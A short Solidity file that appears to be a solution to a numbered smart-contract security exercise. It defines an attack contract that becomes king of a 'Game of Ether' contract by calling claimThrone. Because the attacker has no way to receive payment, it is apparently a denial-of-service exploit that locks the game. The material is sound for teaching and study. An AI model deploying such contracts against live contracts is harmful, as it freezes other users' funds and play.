// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import './Question0017Solution.sol';

contract GameOfEtherAttack {
    Question0017Solution gameOfEther;

    constructor(Question0017Solution _gameOfEther) {
        gameOfEther = Question0017Solution(_gameOfEther);
    }

    function attack() public payable {
        gameOfEther.claimThrone{value: msg.value}();
    }
}
